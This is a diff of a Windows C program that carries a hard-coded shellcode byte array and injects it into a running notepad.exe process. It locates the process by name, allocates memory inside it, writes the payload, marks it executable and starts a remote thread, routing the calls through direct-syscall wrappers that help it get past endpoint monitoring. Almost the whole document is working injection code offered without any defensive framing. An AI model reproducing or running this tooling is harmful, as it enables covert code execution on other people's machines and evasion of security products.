@@ -1,13 +1,8 @@
-#include "Wrappers.h"
-#include "Utils.h"
 #include <windows.h>
 #include <stdio.h>
-
-#ifdef _DEBUG
-#define print_debug(...) printf(__VA_ARGS__)
-#else
-#define print_debug(...) do{}while(0);
-#endif
+#include <tlhelp32.h>
+#include <tchar.h>
+#include "HitAndRun.h"
 
 //https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
 unsigned char buf[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
@@ -40,6 +35,30 @@ unsigned char buf[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
+DWORD FindProcessByName(const TCHAR* procName)
+{
+	HANDLE hSnapshot;
+	DWORD dwProcId = 0;
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+		return 0;
+
+	if (Process32First(hSnapshot, &pe32)) {
+		do {
+			if (_tcsicmp(pe32.szExeFile, procName) == 0) {
+				dwProcId = pe32.th32ProcessID;
+				break;
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
+	return dwProcId;
+}
+
 int main()
 {
 	HANDLE hProcess = NULL, hRemoteThread = NULL;
@@ -48,36 +67,36 @@ int main()
 	SIZE_T bytesWritten = 0;
 	SIZE_T bufLen = sizeof(buf);
 
-	if (!Init())
-		return 0;
+	if (!SW3_PopulateSyscallList())
+		return -1;
 
 	dwTgtProcId = FindProcessByName(TEXT("notepad.exe"));
 	if (dwTgtProcId == 0)
 	{
-		print_debug("[-] target process not found\n");
-		return 0;
+		printf("[-] target process not found\n");
+		return -1;
 	}
-	print_debug("[+] pid: %d\n", dwTgtProcId);
+	printf("[+] pid: %d\n", dwTgtProcId);
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTgtProcId);
 	if (hProcess == NULL)
 	{
-		print_debug("[-] handle not obtained\n");
+		printf("[-] handle not obtained\n");
 		goto Exit;
 	}
-	print_debug("[+] handle obtained\n");
+	printf("[+] handle obtained\n");
 
 	CallNtAllocateVirtualMemory(hProcess, &pRemoteAddr, 0, &bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
+	printf("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
 
 	CallNtWriteVirtualMemory(hProcess, pRemoteAddr, buf, sizeof(buf), &bytesWritten);
-	print_debug("[+] written %lld bytes\n", bytesWritten);
+	printf("[+] written %lld bytes\n", bytesWritten);
 
 	CallNtProtectVirtualMemory(hProcess, &pRemoteAddr, &bufLen, PAGE_EXECUTE_READWRITE, &oldProtect);
-	print_debug("[+] virtual protect\n");
+	printf("[+] virtual protect\n");
 
 	CallCreateRemoteThread(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL);
-	print_debug("[+] remote thread created\n");
+	printf("[+] remote thread created\n");
 
 Exit:
 	if (hRemoteThread != NULL) CloseHandle(hRemoteThread);
